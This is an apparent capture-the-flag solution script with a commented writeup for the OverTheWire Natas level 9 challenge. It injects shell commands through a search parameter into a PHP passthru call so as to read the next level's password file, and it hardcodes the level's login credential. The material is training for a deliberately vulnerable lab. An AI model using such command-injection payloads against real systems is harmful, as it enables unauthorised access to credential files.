#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path='/'

#Custom Headers
custom_headers=''


#Payload
payload='?needle=YZ unexistingfile.txt;strings /etc/natas_webpass/natas10;file&submit=Search'
url=host+path+payload

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content.split('\n')[20]
print(flag)


#WRITEUP
#This time we are given a form to search for files in the server and we are also given the source code below


# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     passthru("grep -i $key dictionary.txt");
# }
# ?>


# The interresting part is passthru("grep -i $key dictionary.txt");
# No validation is done on the key and we cab bypass this by adding other commands on the key variable
# To get the flag we have to read /etc/natas_webpass/natas10
# The original command was grep -i $key dictionary.txt ,since it is unvalidated ,we can add other commands
#grep -i `YZ unexistingfile.txt;strings /etc/natas_webpass/natas10;file` dictionary.txt
#Content between the `` stands for the injected commands
#We get the flag after the command injection



